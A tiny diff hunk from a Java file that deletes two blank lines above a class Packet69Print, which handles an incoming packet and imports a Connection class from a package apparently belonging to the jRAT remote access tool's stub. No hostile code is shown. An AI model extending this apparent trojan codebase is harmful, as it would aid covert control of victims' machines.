@@ -4,8 +4,6 @@ import javax.swing.JTextPane;
 
 import pro.jrat.stub.Connection;
 
-
-
 public class Packet69Print extends AbstractIncomingPacket {
 
 	@Override
